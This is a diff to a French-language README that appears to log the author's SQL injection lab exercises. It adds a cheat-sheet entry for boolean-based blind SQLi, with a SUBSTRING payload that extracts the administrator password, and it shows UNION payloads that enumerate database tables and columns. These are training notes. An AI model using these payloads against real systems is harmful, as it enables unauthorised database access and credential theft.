@@ -15,7 +15,7 @@ Bienvenue dans mon arsenal offensif. Ce dossier recense mes victoires sur les la
 - [x] 🟠 **Praticien** : [UNION attacks - Retrieving multiple values in a single column](./06-union-concat.md)
 - [x] 🟠 **Praticien** : [SQLi - Querying the database type and version](./07-union-db-version.md)
 - [x] 🟠 Praticien : [SQLi - Listing the database contents on non-Oracle](./08-union-schema-enum.md)
-- [ ] 🔴 **Expert** : Blind SQL injection with conditional responses
+- [x] 🔴 Expert : [Blind SQL injection with conditional responses](./09-blind-sqli-conditional.md)
 
 ---
 
@@ -50,7 +50,13 @@ Bienvenue dans mon arsenal offensif. Ce dossier recense mes victoires sur les la
 *Interroger le dictionnaire de données pour trouver les tables et colonnes cachées (Non-Oracle).*
 
 * **Lister les Tables :** `' UNION SELECT table_name, NULL FROM information_schema.tables--`
-* **Lister les Colonnes d'une Table spécifique :** `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='nom_de_la_table_trouvee'--`    
+* **Lister les Colonnes d'une Table spécifique :** `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='nom_de_la_table_trouvee'--`   
+
+### 5. Injections SQL en Aveugle (Blind SQLi)
+*Quand la base de données ne renvoie rien, mais réagit différemment selon si la condition est vraie ou fausse.*
+
+* **Boolean-Based (Test Vrai/Faux avec SUBSTRING) :** `xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a`
+    * *Méthode :* Poser des questions fermées (OUI/NON) à la base de données. Automatiser l'extraction avec Burp Suite Intruder (Cluster Bomb) en faisant varier la position (1, 2, 3...) et le caractère à tester (a, b, c...). Identifier les succès via une différence de longueur de réponse HTTP ou de code statut.
         
 
 
